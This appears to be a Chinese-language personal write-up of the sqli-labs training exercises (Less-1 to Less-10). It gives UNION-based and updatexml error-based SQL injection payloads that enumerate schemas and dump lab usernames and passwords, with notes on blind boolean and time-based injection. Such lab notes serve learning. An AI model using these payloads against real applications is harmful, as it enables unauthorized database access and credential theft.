### Sqli-labs



##### 1. less-1,single quotes - String

显示位置在2,3号

http://192.168.217.113:7766/Less-1/?id=1' union select 1,2,3 limit 1,1 --+

```sql
// 查询库名： 
(select group_concat(schema_name) from information_schema.schema)
// 查询表名： 
(select group_concat(table_name) from information_schema.tables where table_schema='security')
// 查询表内列名： 
(select group_concat(column_name) from information_schema.columns where table_name='users')
// 爆破所有数据: 
(select group_concat(username) from security.users) ,  (select group_concat(password) from security.users)
```





##### 2. Less-2, - integer

http://192.168.217.113:7766/Less-1/?id=1 union select 1,2,3 limit 1,1 --+

整型和字符型的区别  在于需不需要提前使用`'`进行截断

```php
// 字符串型
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
// 整型
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```



##### 3. Less-3,Single quotes with twist - String

http://192.168.217.113:7766/Less-1/?id=1') union select 1,2,3 limit 1,1 --+

上面的方式不能生效了，对比之后多了个`()`，因此需要补全括号，否则永远被括号括起来，最后结果还是逃不掉最后的limit

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```



##### 4. Less-4,Double Quotes - String

http://172.16.51.129:7766/Less-4/?id=1") union select 1,2,3 limit 1,1 --+

 使用`""`对查询内容进行拼接，并且放在了`()`中。

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

```



##### 5. Less-5,Single Quote - String

http://172.16.51.129:7766/Less-5/?id=1'

从输出可知（无回显），页面只会展示成功或失败的逻辑，但是输入`1'`会输出错误，则可以使用错误注入

```sql
// undatexml 存在返回长度为32，因此需要使用substr，一段一段去获取
// 查询库名
and (updatexml(1,concat(0x7e, substr((select group_concat(schema_name) from information_schema.schema),64,32 ),0x7e),1));
// 结果： information_schema,challenges,mysql,performance_schema,security
// 查询表名
and (updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema="security") ,0x7e),1));
// 结果：emails,referers,uagents,users
// 查询列名
and (updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name="users") ,0x7e),1));
// 结果： id,username,password
// 爆破数据
and (updatexml(1,concat(0x7e, substr((select group_concat(username) from security.users),1,32 ),0x7e),1));
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
and (updatexml(1,concat(0x7e, substr((select group_concat(password) from security.users),1,32 ),0x7e),1));
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```



##### 6. Double Quotes -String

尝试加`'`,`"`，在使用双引号的时候，会有回显

http://172.16.104.130:7766/Less-6/?id=1"



##### 7. Dump Into outfield - String

没有回显，而且感觉会根据sql查询结果，如果查询失败，就页面显示失败不是调用`sql_error()`那种，成功就展示成功语句。应该只能使用布尔。

有点贱，用了两个`()`

```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";	
```

http://172.16.104.130:7766/Less-7/?id=1')) and 1=1 跟 1=2 ，会有正确或错误返回。

**ps：**别人答案是使用outfile写shell？





##### 8. Boolian Based - Single Quotes

这题只有成功会显示，失败就啥东西都没有，很恶心。

并且在你构造语句的时候，在处理完`'`之后，需要在语句结尾补齐`;`否则还是会语句有错。

之后的是就是布尔。

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";	
```





##### 9. Bind - Time Based - Singe Quote

无论成功，还是失败，返回的内容都是一样的，绝望。。。只能使用最蠢的时间。



##### 10. Blind - Time Based - Double Quote

